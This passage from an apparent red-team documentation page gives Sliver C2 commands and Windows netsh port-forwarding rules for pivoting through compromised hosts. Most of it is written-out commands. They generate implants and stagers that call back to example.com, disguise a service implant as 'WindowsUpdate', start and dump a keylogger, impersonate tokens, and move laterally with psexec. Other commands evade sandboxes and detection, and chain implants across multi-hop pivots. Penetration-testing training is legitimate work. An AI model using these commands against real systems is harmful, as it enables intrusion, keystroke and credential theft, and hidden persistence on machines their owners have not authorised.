style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token operator">&gt;</span><span class="token plain"> generate stager </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--http</span><span class="token plain"> example.com </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--os</span><span class="token plain"> windows </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--arch</span><span class="token plain"> amd64 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--format</span><span class="token plain"> shellcode</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Generate implant with custom settings</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token operator">&gt;</span><span class="token plain"> generate </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--http</span><span class="token plain"> example.com </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--os</span><span class="token plain"> linux </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--arch</span><span class="token plain"> amd64 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--name</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;custom-implant&quot;</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--debug</span><span class="token plain"> --skip-symbols</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Service implant for persistence</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token operator">&gt;</span><span class="token plain"> generate </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--http</span><span class="token plain"> example.com </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--os</span><span class="token plain"> windows </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--format</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">service</span><span class="token plain"> --service-name </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;WindowsUpdate&quot;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="84-pivoting-and-network-tunneling">8.4 Pivoting and Network Tunneling<a href="#84-pivoting-and-network-tunneling" class="hash-link" aria-label="Direct link to 8.4 Pivoting and Network Tunneling" title="Direct link to 8.4 Pivoting and Network Tunneling" translate="no">‚Äã</a></h3>
<p>Sliver session implants allow operators to create SOCKS5 proxies and pivots for tunneling traffic through compromised hosts:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Select session for pivoting</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token operator">&gt;</span><span class="token plain"> use </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">session-id</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Start SOCKS5 proxy</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">session</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> socks5 start </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--host</span><span class="token plain"> </span><span class="token number">127.0</span><span class="token plain">.0.1 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--port</span><span class="token plain"> </span><span class="token number">1080</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># List active SOCKS proxies</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token operator">&gt;</span><span class="token plain"> socks5</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Stop SOCKS proxy</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">session</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> socks5 stop </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-i</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">proxy-id</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Port forwarding</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">session</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> portfwd </span><span class="token function" style="color:rgb(80, 250, 123)">add</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--remote</span><span class="token plain"> </span><span class="token number">192.168</span><span class="token plain">.2.100:3389 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--local</span><span class="token plain"> :3389</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># List port forwards</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">session</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> portfwd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Create pivot listener</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">session</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> pivots tcp </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--bind</span><span class="token plain"> </span><span class="token number">192.168</span><span class="token plain">.2.100:9090</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Generate pivot implant</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token operator">&gt;</span><span class="token plain"> generate --tcp-pivot </span><span class="token number">192.168</span><span class="token plain">.2.100:9090</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="85-advanced-sliver-operations">8.5 Advanced Sliver Operations<a href="#85-advanced-sliver-operations" class="hash-link" aria-label="Direct link to 8.5 Advanced Sliver Operations" title="Direct link to 8.5 Advanced Sliver Operations" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Process injection and migration</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">session</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> migrate </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">pid</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Execute .NET assembly in memory</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">session</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> execute-assembly /path/to/assembly.exe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Load and execute BOF (Beacon Object File)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">session</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> bof /path/to/bof.o</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Screenshot capture</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">session</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> screenshot</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Keylogger</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">session</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> keylogger start</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">session</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> keylogger dump</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Token manipulation</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">session</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> impersonate </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">username</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Lateral movement via psexec</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">session</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> psexec </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--host</span><span class="token plain"> </span><span class="token number">192.168</span><span class="token plain">.2.101 --service-name </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;UpdateService&quot;</span><span class="token plain"> --service-desc </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;Windows Update&quot;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="86-beacon-management">8.6 Beacon Management<a href="#86-beacon-management" class="hash-link" aria-label="Direct link to 8.6 Beacon Management" title="Direct link to 8.6 Beacon Management" translate="no">‚Äã</a></h3>
<p>Beacons check in with the server at configurable intervals, making them less noisy than session implants:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Interact with beacon</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token operator">&gt;</span><span class="token plain"> use </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">beacon-id</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Check beacon tasks</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">beacon</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> tasks</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Fetch task results</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">beacon</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> tasks fetch </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">task-id</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Reconfigure beacon</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">beacon</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> reconfig </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--interval</span><span class="token plain"> </span><span class="token number">120</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--jitter</span><span class="token plain"> </span><span class="token number">30</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Execute commands</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">beacon</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> execute </span><span class="token function" style="color:rgb(80, 250, 123)">whoami</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">beacon</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> shell </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;net user&quot;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="87-detection-evasion-features">8.7 Detection Evasion Features<a href="#87-detection-evasion-features" class="hash-link" aria-label="Direct link to 8.7 Detection Evasion Features" title="Direct link to 8.7 Detection Evasion Features" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Traffic encryption (built-in)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># All C2 traffic encrypted independently of transport protocol</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Canary domains for sandbox detection</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token operator">&gt;</span><span class="token plain"> generate </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--http</span><span class="token plain"> example.com </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--canary</span><span class="token plain"> google.com,microsoft.com</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Custom obfuscation</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token operator">&gt;</span><span class="token plain"> generate </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--http</span><span class="token plain"> example.com </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--os</span><span class="token plain"> windows </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--obfuscate</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Traffic profiles</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token operator">&gt;</span><span class="token plain"> profiles new </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--name</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;chrome&quot;</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--format</span><span class="token plain"> http</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token operator">&gt;</span><span class="token plain"> profiles set-header </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;chrome&quot;</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;User-Agent&quot;</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;Mozilla/5.0 Chrome/91.0&quot;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="88-multi-hop-pivot-chains">8.8 Multi-Hop Pivot Chains<a href="#88-multi-hop-pivot-chains" class="hash-link" aria-label="Direct link to 8.8 Multi-Hop Pivot Chains" title="Direct link to 8.8 Multi-Hop Pivot Chains" translate="no">‚Äã</a></h3>
<p>Pivots can be arbitrarily nested, allowing traffic to route through multiple compromised hosts:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Establish first pivot</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token operator">&gt;</span><span class="token plain"> use session-1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">session-1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> pivots tcp </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--bind</span><span class="token plain"> </span><span class="token number">10.10</span><span class="token plain">.10.100:8888</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Generate implant for second hop</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token operator">&gt;</span><span class="token plain"> generate --tcp-pivot </span><span class="token number">10.10</span><span class="token plain">.10.100:8888 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--name</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;hop2&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># After second implant connects, create another pivot</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token operator">&gt;</span><span class="token plain"> use session-2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">session-2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> pivots tcp </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--bind</span><span class="token plain"> </span><span class="token number">172.16</span><span class="token plain">.1.50:9999</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Generate implant for third hop</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token operator">&gt;</span><span class="token plain"> generate --tcp-pivot </span><span class="token number">172.16</span><span class="token plain">.1.50:9999 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--name</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;hop3&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Result: Attacker ‚Üí Session-1 ‚Üí Session-2 ‚Üí Session-3</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="9-windows-specific-pivoting-tools">9. Windows-Specific Pivoting Tools<a href="#9-windows-specific-pivoting-tools" class="hash-link" aria-label="Direct link to 9. Windows-Specific Pivoting Tools" title="Direct link to 9. Windows-Specific Pivoting Tools" translate="no">‚Äã</a></h2>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</div><div class="admonitionContent_BuS1"><p>These sections assume you have administrative privileges on the Windows host. Substitute IP addresses, ports, usernames, and file paths as required by your target environment. Ensure all binaries (e.g., Plink, PowerShell scripts) are accessible on the system.</p></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="91-netsh-port-forwarding">9.1 Netsh Port Forwarding<a href="#91-netsh-port-forwarding" class="hash-link" aria-label="Direct link to 9.1 Netsh Port Forwarding" title="Direct link to 9.1 Netsh Port Forwarding" translate="no">‚Äã</a></h3>
<p>Windows netsh provides native port forwarding capabilities without requiring additional tools:</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Enable IP forwarding</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">netsh interface ipv4 set global forwarding=enabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Add port forwarding rule</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">netsh interface portproxy add v4tov4 listenport=8080 listenaddress=127.0.0.1 connectport=80 connectaddress=192.168.1.100</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Forward RDP through pivot</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=10.10.10.10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Show all port forwarding rules</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">netsh interface portproxy show all</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Delete specific rule</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=127.0.0.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Reset all port forwarding rules</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">netsh interface portproxy reset</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Advanced rule with specific interface</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">netsh interface portproxy add v4tov4 listenport=443 listenaddress=192.168.1.100 connectport=443 connectaddress=10.0.0.100</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="92-plink-putty-link-implementation">9.2 Plink (PuTTY Link) Implementation<a href="#92-plink-putty-link-implementation" class="hash-link" aria-label="Direct link to 9.2 Plink (PuTTY Link) Implementation" title="Direct link to 9.2 Plink (PuTTY Link) Implementation" translate="no">‚Äã</a></h3>
<p>Plink provides command-line SSH connectivity for Windows environments:</p>
